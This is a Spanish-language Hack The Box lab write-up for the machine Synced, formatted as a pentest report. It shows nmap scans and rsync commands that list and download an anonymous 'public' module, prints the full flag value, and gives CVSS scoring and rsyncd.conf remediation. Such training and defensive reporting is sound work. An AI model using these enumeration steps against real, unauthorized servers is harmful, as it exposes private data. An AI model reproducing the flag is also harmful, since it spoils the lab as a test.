---
title: Synced
os: Linux
dificultad: Very Easy
ip: 10.129.228.37
fecha: 2026-10-17
categoria: Starting Point
estado: completada
tags: [htb, linux, rsync, unauthenticated-access, misconfiguration]
---

# Synced — Informe de Pentest

> Writeup de la máquina **Synced** de [Hack The Box](https://www.hackthebox.com/). Documento con fines educativos, realizado en un entorno de laboratorio autorizado.

## Información general

| Campo                   | Detalle         |
| ----------------------- | --------------- |
| **Máquina**             | Synced          |
| **Sistema operativo**   | Linux           |
| **Dificultad**          | Very Easy       |
| **Categoría**           | Starting Point  |
| **Dirección IP**        | `10.129.228.37` |
| **Fecha de resolución** | 2026-10-17      |
| **Autor del informe**   | NiettoFrann     |
| **Estado**              | Completada      |

## Índice

1. [Resumen ejecutivo](#resumen-ejecutivo)
2. [Hallazgos de un vistazo](#hallazgos-de-un-vistazo)
3. [Alcance y metodología](#alcance-y-metodología)
4. [Cadena de ataque](#cadena-de-ataque)
5. [Reconocimiento](#reconocimiento)
6. [Enumeración](#enumeración)
7. [Explotación (Foothold)](#explotación-foothold)
8. [Escalada de privilegios](#escalada-de-privilegios)
9. [Flags](#flags)
10. [Detalle de hallazgos](#detalle-de-hallazgos)
11. [Plan de remediación priorizado](#plan-de-remediación-priorizado)
12. [Lecciones aprendidas](#lecciones-aprendidas)
13. [Herramientas utilizadas](#herramientas-utilizadas)
14. [Evidencia](#evidencia)
15. [Referencias](#referencias)

---

## Resumen ejecutivo

Se evaluó, desde fuera y sin credenciales, un servidor Linux de laboratorio que ofrece un servicio de sincronización de archivos.

**Resultado:** el servicio publica una carpeta compartida a la que cualquier persona con acceso a la red puede entrar sin usuario ni contraseña. Se listó su contenido y se descargó un archivo con una sola herramienta estándar y en menos de un minuto.

**Por qué importa:** todo lo que se guarde en esa carpeta queda expuesto. Se confirmó la lectura; no se probó si también permite escribir o borrar, por lo que esa posibilidad queda sin confirmar. En un entorno real implicaría fuga de información y, si hubiera escritura, la posibilidad de alterar archivos que otros sistemas consideran fiables.

**Qué hacer:**
1. Exigir usuario y contraseña en la carpeta compartida (esfuerzo bajo, plazo: 24-48 h).
2. Limitar el servicio a los equipos que realmente lo necesitan (24-48 h).
3. Revisar el contenido de la carpeta y los registros de conexión para descartar accesos previos (≤ 7 días).

**Riesgo global: Alto.** Puntuado asumiendo exposición real, no solo de laboratorio.

| Severidad | Hallazgos |
| --------- | --------- |
| Alta      | 1         |

## Hallazgos de un vistazo

| ID   | Hallazgo                                                | Severidad | CVSS | Estado                         |
| ---- | ------------------------------------------------------- | --------- | ---- | ------------------------------ |
| H-01 | Módulo rsync `public` accesible sin autenticación       | Alta      | 7.5  | Explotado y confirmado (lectura) |

## Alcance y metodología

- **Objetivo:** `10.129.228.37` (Synced)
- **Tipo de prueba:** caja negra, sin credenciales previas.
- **Reglas de enjuiciamiento:** entorno de laboratorio autorizado. No se realizaron ataques de denegación de servicio ni se modificó o eliminó ningún dato en el objetivo.
- **Metodología:** Reconocimiento → Enumeración → Explotación → Post-explotación / Escalada de privilegios → Documentación.
- **Entorno:** conexión a la VPN de HTB desde Linux.

## Cadena de ataque

```text
Ping (TTL 63 → Linux)
  -> Escaneo de 65535 puertos (solo 873/tcp)
  -> Escaneo detallado: rsync, protocolo 31                              [H-01]
  -> rsync <IP>:: lista el módulo "public" sin credenciales              [H-01]
  -> rsync <IP>::public lista flag.txt                                   [H-01]
  -> rsync -av descarga el contenido -> cat flag.txt                     [H-01]
  -> Flag
```

Un único hallazgo, por lo que no hay encadenamiento entre fallos.

---

## Reconocimiento

### Conectividad y sistema operativo

**Objetivo:** confirmar que el host está activo y estimar su sistema operativo.

```bash
ping -c 1 10.129.228.37 | tee loot/ping.txt
```

```text
64 bytes from 10.129.228.37: icmp_seq=1 ttl=63 time=238 ms
1 packets transmitted, 1 received, 0% packet loss
```

> Evidencia: [`loot/ping.txt`](loot/ping.txt)

**Interpretación:** host activo a ~238 ms. Los sistemas Linux parten de TTL 64; el 63 indica un salto intermedio (la VPN). Sistema **Linux**.

### Escaneo de puertos

**Objetivo:** descubrir la superficie de ataque completa. Se escanean los 65535 puertos TCP de forma rápida y luego se profundiza solo en los abiertos.

```bash
nmap -p- --min-rate=5000 -T4 -Pn -n 10.129.228.37 -oN loot/puertos.txt
```

```text
Not shown: 65534 closed tcp ports (conn-refused)
PORT    STATE SERVICE
873/tcp open  rsync
```

> Evidencia: [`loot/puertos.txt`](loot/puertos.txt)

| Opción            | Motivo                                                   |
| ----------------- | -------------------------------------------------------- |
| `-p-`             | Todos los puertos (1-65535).                             |
| `--min-rate=5000` | Envía al menos 5000 paquetes/s para acelerar el escaneo. |
| `-T4`             | Plantilla de tiempos agresiva.                           |
| `-Pn`             | Omite el descubrimiento de host (se asume activo).       |
| `-n`              | Sin resolución DNS.                                      |
| `-oN`             | Guarda la salida en formato normal.                      |

**Decisión:** un solo servicio abierto. El puerto 873 es el estándar de rsync y es el único candidato.

### Detección de versiones y scripts

```bash
nmap -p873 -sCV -Pn -n -T4 10.129.228.37 -oN loot/detallado.txt
```

```text
PORT    STATE SERVICE VERSION
873/tcp open  rsync   (protocol version 31)
```

> Evidencia: [`loot/detallado.txt`](loot/detallado.txt)

| Puerto  | Estado | Servicio | Versión                    |
| ------- | ------ | -------- | -------------------------- |
| 873/tcp | open   | rsync    | protocolo 31 (versión del software no identificada) |

**Interpretación:** nmap solo identifica la versión del protocolo (31), no la del software. No se aporta número de versión ni CVE porque no se pudo determinar.

## Enumeración

### rsync (873/tcp)

**Objetivo:** comprobar si el servicio expone módulos (carpetas compartidas) y si exigen autenticación.

```bash
rsync 10.129.228.37::
```

```text
public         	Anonymous Share
```

El servicio responde con la lista de módulos sin pedir credenciales. Existe un módulo llamado `public`, descrito como "Anonymous Share".

```bash
rsync 10.129.228.37::public
```

```text
drwxr-xr-x          4,096 2022/10/24 19:02:23 .
-rw-r--r--             33 2022/10/24 18:32:03 flag.txt
```

> Evidencia: [`loot/rsync.txt`](loot/rsync.txt)

**Decisión:** el módulo se lista sin autenticación y contiene `flag.txt` (33 bytes, el tamaño de una flag de 32 caracteres más salto de línea). Se descarga para confirmar la lectura.

## Explotación (Foothold)

- **Vulnerabilidad:** módulo rsync `public` sin autenticación, accesible desde la red.
- **Referencia:** [CWE-306 – Missing Authentication for Critical Function](https://cwe.mitre.org/data/definitions/306.html). No hay CVE: es un error de configuración.
- **Impacto:** lectura de todo el contenido del módulo.

### Procedimiento

```bash
mkdir -p loot/public && rsync -av rsync://10.129.228.37/public/ loot/public/
cat loot/public/flag.txt
```

```text
receiving incremental file list
./

sent 27 bytes  received 81 bytes  11.37 bytes/sec
total size is 33  speedup is 0.31

72eaf5344ebb84908ae543a719830519
```

> Evidencia: [`loot/rsync.txt`](loot/rsync.txt) · [`loot/flag.txt`](loot/flag.txt)

**Resultado:** descarga de `flag.txt` y lectura confirmada. No se subió ni se modificó ningún archivo en el servidor.

> **No se obtuvo shell en el sistema.** El acceso se limita a la lectura del módulo `public`, lo cual cumple el objetivo de la máquina.

## Escalada de privilegios

No se realizó. El objetivo de la máquina (leer la flag del módulo) se alcanzó con el acceso inicial, que no incluye ejecución de comandos en el host. No se probó la escritura en el módulo ni se buscó una vía hacia una shell.

**Qué habría pasado con más alcance:** un módulo rsync con escritura permitiría subir o reemplazar archivos, y en ciertas configuraciones eso es un paso previo hacia la ejecución de código (por ejemplo, subiendo claves SSH a un directorio personal). Este informe no lo prueba, por lo que es una **posibilidad no confirmada**.

---

## Flags

| Flag   | Valor                              |
| ------ | ---------------------------------- |
| `flag` | `72eaf5344ebb84908ae543a719830519` |

> Synced pertenece a Starting Point: solo existe una flag, obtenida del módulo rsync (no hay `user.txt` / `root.txt`). Se muestra completa por coherencia con los demás informes de Starting Point del repositorio. Evidencia: [`loot/flag.txt`](loot/flag.txt).

## Detalle de hallazgos

### H-01 — Módulo rsync `public` accesible sin autenticación

| Campo           | Detalle                                                                                                   |
| --------------- | --------------------------------------------------------------------------------------------------------- |
| **Severidad**   | Alta                                                                                                      |
| **CVSS v3.1**   | 7.5 — `CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:N/A:N`                                                     |
| **CWE**         | [CWE-306 – Missing Authentication for Critical Function](https://cwe.mitre.org/data/definitions/306.html) |
| **CVE**         | N/A (error de configuración, no un defecto del software)                                                  |
| **Componente**  | rsync (protocolo 31) — 873/tcp, módulo `public`                                                           |
| **Estado**      | Explotado y confirmado (lectura)                                                                          |

**Descripción.** El servicio rsync enumera sus módulos y permite descargar el contenido de `public` sin pedir usuario ni contraseña.

**Impacto.** Cualquier persona con conectividad de red puede leer todo lo que se guarde en el módulo. *Confirmado:* listado y descarga de `flag.txt`. *No probado:* escritura o borrado; por eso la puntuación solo incluye confidencialidad (I:N, A:N). Si el módulo permitiera escribir, la severidad subiría a Crítica (9.8). Puntuado asumiendo exposición real.

**Evidencia.** Listado de módulos y del contenido, y descarga con `rsync` sin credenciales: [`loot/rsync.txt`](loot/rsync.txt). Servicio abierto en [`loot/puertos.txt`](loot/puertos.txt) y [`loot/detallado.txt`](loot/detallado.txt).

**Remediación.**
- *Corrección:* exigir autenticación en el módulo (`/etc/rsyncd.conf`) y retirar el acceso anónimo:
  ```ini
  [public]
      path = /srv/public
      read only = yes
      auth users = backup
      secrets file = /etc/rsyncd.secrets   # chmod 600
  ```
- *Mitigación:* restringir con `hosts allow` y reglas de firewall el puerto 873 a los equipos que sincronizan; no exponer rsync a redes no confiables. Alternativa: sincronizar sobre SSH.
- *Detección:* revisar el registro de rsync (`log file` en `rsyncd.conf`) en busca de transferencias desde IPs desconocidas y comprobar la integridad del contenido del módulo.

**Referencias.** [rsyncd.conf(5)](https://download.samba.org/pub/rsync/rsyncd.conf.5) · [HackTricks – 873 rsync](https://book.hacktricks.xyz/network-services-pentesting/873-pentesting-rsync)

## Plan de remediación priorizado

| Prioridad | Acción                                                                             | Hallazgos | Esfuerzo | Reducción de riesgo | Plazo sugerido |
| --------- | ---------------------------------------------------------------------------------- | --------- | -------- | ------------------- | -------------- |
| P1        | Activar `auth users` y `secrets file` en el módulo, retirar el acceso anónimo      | H-01      | Bajo     | Alto → Bajo         | 24-48 h        |
| P1        | Restringir 873/tcp con `hosts allow` y firewall a los equipos que lo necesitan     | H-01      | Bajo     | Alto → Bajo         | 24-48 h        |
| P2        | Revisar logs de conexión y el contenido del módulo para detectar acceso previo     | H-01      | Medio    | Detección           | ≤ 7 días       |

P1 es aplicable de inmediato y por sí solo elimina el vector explotado.

## Lecciones aprendidas

- Un solo puerto abierto simplifica la decisión, pero hay que reconocer el servicio por su puerto estándar (`873` → rsync).
- `rsync <IP>::` lista módulos y es la primera comprobación de acceso anónimo; el módulo se descarga con `rsync -av rsync://<IP>/<módulo>/`.
- Un servicio de transferencia sin autenticación es un fallo de configuración, no de software: el número de versión es irrelevante si el acceso está abierto.
- Separar lo confirmado (lectura) de lo no probado (escritura) permite defender la severidad asignada.

## Herramientas utilizadas

| Herramienta | Uso                                              |
| ----------- | ------------------------------------------------ |
| ping        | Test de conectividad y estimación del SO por TTL |
| nmap        | Escaneo de puertos y detección de servicio       |
| rsync       | Listado de módulos y descarga del contenido      |

## Evidencia

Todos los artefactos están en la carpeta [`loot/`](loot/):

| Fichero                               | Contenido                                                              |
| ------------------------------------- | ---------------------------------------------------------------------- |
| [`ping.txt`](loot/ping.txt)           | Test de conectividad (TTL 63).                                         |
| [`puertos.txt`](loot/puertos.txt)     | Escaneo completo de puertos (solo 873/tcp abierto).                    |
| [`detallado.txt`](loot/detallado.txt) | Detección de servicio: rsync, protocolo 31.                            |
| [`rsync.txt`](loot/rsync.txt)         | Listado de módulos, contenido de `public`, descarga y lectura de la flag. |
| [`flag.txt`](loot/flag.txt)           | Flag descargada del módulo.                                            |

## Referencias

- [Página de la máquina en HTB](https://app.hackthebox.com/machines/Synced)
- [CWE-306 – Missing Authentication for Critical Function](https://cwe.mitre.org/data/definitions/306.html)
- [rsyncd.conf(5)](https://download.samba.org/pub/rsync/rsyncd.conf.5)
- [HackTricks – 873 rsync](https://book.hacktricks.xyz/network-services-pentesting/873-pentesting-rsync)
